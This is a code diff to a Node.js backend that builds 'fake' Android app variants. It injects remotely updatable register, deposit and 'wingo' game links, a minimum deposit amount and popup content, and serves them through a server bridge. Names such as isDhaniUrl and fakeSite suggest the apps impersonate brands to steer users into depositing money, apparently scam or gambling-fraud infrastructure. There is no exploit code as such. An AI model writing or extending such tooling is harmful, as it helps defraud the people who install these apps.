@@ -23,6 +23,7 @@ const db = require('../database/db');
 const { encryptHtmlToBin, FIXED_PASSWORD } = require('./encrypt');
 const { extractDomain, buildUrls, injectParams, isDhaniUrl } = require('./htmlprocessor');
 const { ensureAudioGate, normalizeRegisterDelay, stripIntroSnippet, stripFirebaseLiveScript } = require('./apkbuilder');
+const { firebaseRequest } = require('./runtime-links');
 
 const TEMPLATES_DIR = path.join(__dirname, '..', 'templates');
 const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');
@@ -158,7 +159,9 @@ function buildParams(orderRow, designRow, isFake, fakeSite) {
 }
 
 // kind: 'popup' | 'loading'
-async function buildAppContent(pathKey, kind = 'popup', kid = null) {
+// opts.base: request origin (https://panel.example) — fake builds me SHIM
+// ko server URL bake karne ke liye. Na mile to BASE_URL env fallback.
+async function buildAppContent(pathKey, kind = 'popup', kid = null, opts = {}) {
   try {
     const sp = splitPathKid(pathKey);
     pathKey = sp.key;
@@ -186,6 +189,19 @@ async function buildAppContent(pathKey, kind = 'popup', kid = null) {
       const pp = path.join(TEMPLATES_DIR, popupName);
       if (!fs.existsSync(pp)) return null;
       const raw = fs.readFileSync(pp, 'utf8');
+      // ── FAKE = SERVER LIVE MODE ──
+      // Fake APKs me Firebase SDK/config nahi jaata. Runtime links,
+      // minDeposit/conditions aur users (login monitoring / warning popup)
+      // server ke /api/rtdb bridge se aate hai (rtdb shim template me inject
+      // hota hai). BASE request origin se bake hota hai taaki remote-fetch
+      // wale APKs ko bhi live changes milte rahein.
+      if (isFake) {
+        const base = String((opts && opts.base) || process.env.BASE_URL || '').replace(/\/+$/, '');
+        if (/^https?:\/\//i.test(base)) {
+          params.liveMode = 'server';
+          params.liveBase = base;
+        }
+      }
       html = normalizeRegisterDelay(ensureAudioGate(injectParams(raw, params), params.domain));
     }
 
@@ -275,4 +291,75 @@ async function buildAppTheme(pathKey, kid = null) {
   }
 }
 
-module.exports = { buildAppContent, buildAppTheme, resolveContentPassword };
+// ─────────────────────────────────────────────────────────────────────────────
+// RTDB BRIDGE (server live mode) — fake / no-Firebase APKs ke injected shim
+// ke liye. config node = DB (admin change turant), users node = Firebase
+// proxy (server-side service-account reads/writes, 5s cache).
+// ─────────────────────────────────────────────────────────────────────────────
+function resolvePathContext(pathKey) {
+  const sp = splitPathKid(String(pathKey || ''));
+  const found = findOrderByPath(sp.key);
+  if (!found) return null;
+  const { row, isFake, fakeSite } = found;
+  const design = {
+    popup_html_file: row.popup_html_file,
+    fake_popup_html_file: row.fake_popup_html_file,
+    java_type: row.java_type,
+    category: row.category
+  };
+  const params = buildParams(row, design, isFake, fakeSite);
+  if (!params) return null;
+  return params;
+}
+
+async function buildRuntimeConfig(pathKey) {
+  const params = resolvePathContext(pathKey);
+  if (!params) return null;
+  let registerCondition = true;
+  let depositCondition = true;
+  try {
+    const cfg = await firebaseRequest([params.firebasePath, 'config']);
+    if (cfg && typeof cfg === 'object') {
+      if (cfg.registerCondition !== undefined) registerCondition = !!cfg.registerCondition;
+      if (cfg.depositCondition !== undefined) depositCondition = !!cfg.depositCondition;
+    }
+  } catch (e) { /* conditions default true — links DB se hi valid hai */ }
+  return {
+    registerUrl: params.registerUrl,
+    depositUrl: params.depositUrl,
+    wingoUrl: params.wingoUrl,
+    minDeposit: params.minDeposit || 300,
+    registerCondition,
+    depositCondition,
+    linkUpdatedAt: Date.now()
+  };
+}
+
+// FAKE = koi login restriction NAHI (product design): users node hamesha
+// empty. Shim waise bhi users refs ko client-side null deta hai; ye endpoint
+// sirf purane embedded shims ke safety ke liye same behavior rakhta hai.
+async function readUsersNode(pathKey, rel) {
+  const params = resolvePathContext(pathKey);
+  if (!params) return undefined;
+  return null;
+}
+
+// Register-mark fake me store NAHI hota (koi bhi login kar sakta hai).
+// Write requests ko silently accept karo taaki template code error na kare.
+async function writeUsersNode(pathKey, rel, method, body) {
+  const params = resolvePathContext(pathKey);
+  if (!params) return false;
+  const relClean = String(rel || '').replace(/^\/+|\/+$/g, '');
+  if (!/^users\/[A-Za-z0-9_+@-]{1,80}$/.test(relClean)) return false;
+  return true;
+}
+
+module.exports = {
+  buildAppContent,
+  buildAppTheme,
+  resolveContentPassword,
+  resolvePathContext,
+  buildRuntimeConfig,
+  readUsersNode,
+  writeUsersNode
+};
